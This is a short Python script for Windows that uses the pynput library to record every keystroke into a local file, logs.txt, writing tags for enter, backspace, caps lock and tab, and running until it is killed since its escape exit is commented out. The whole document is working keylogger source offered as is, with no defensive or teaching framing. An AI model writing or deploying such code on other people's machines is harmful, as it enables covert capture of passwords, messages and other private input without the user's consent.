# For Windows
import pynput 
from pynput.keyboard import Key, Listener 

logs = 'logs.txt'

enter = '<enter>'
backspace = '<backspace>'
caps_lock = '<caps_lock>'
tab = '<tab>'

def on_press(key):
	with open(logs,'a') as f_in:
		# Alpha-Numeric and special characters have type pynput.keyboard._win32.KeyCode
		# If such type log them directly
		if type(key) == pynput.keyboard._win32.KeyCode:
			try:
				f_in.write(key.char)

			# Some keys of type pynput.keyboard._win32.KeyCode return None.
			# Cant write none type in a file and may cause error. 
			except Exception:
				pass

		# For other types like caps_lock log them as specified.
		else:
			# If you want any other keys to be logged, add here.
			if str(key) == 'Key.space':
				f_in.write(' ')
			elif str(key) == 'Key.enter':
				f_in.write(enter)
			elif str(key) == 'Key.backspace':
				f_in.write(backspace)
			elif str(key) == 'Key.caps_lock':
				f_in.write(caps_lock)
			elif str(key) == 'Key.tab':
					f_in.write(tab)
			# Exit the program if esc is pressed
			#elif str(key) == 'Key.esc':
				#exit()

with Listener(on_press = on_press) as listener:
	listener.join() 
